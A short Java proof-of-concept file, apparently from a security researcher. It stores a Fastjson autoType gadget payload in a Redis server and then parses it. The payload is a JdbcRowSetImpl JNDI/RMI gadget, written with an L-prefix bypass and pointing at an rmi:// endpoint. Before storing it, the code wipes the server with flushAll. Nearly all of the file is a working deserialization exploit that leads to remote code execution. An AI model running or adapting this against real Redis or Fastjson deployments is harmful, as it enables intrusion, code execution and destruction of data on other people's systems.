package cn.b1ue.redis.unserialize;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import redis.clients.jedis.Jedis;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2020/4/3 15:33
 */
public class Fastjson {

    public static void main(String[] args) {

        Jedis jedis = new Jedis("192.168.91.147", 6379);
        jedis.flushAll();
        jedis.set("x","{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:2333/exp\",\"autoCommit\":\"true\"}");
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String x = jedis.get("x");
        JSON.parse(x);
        jedis.save();
        jedis.close();



    }

}
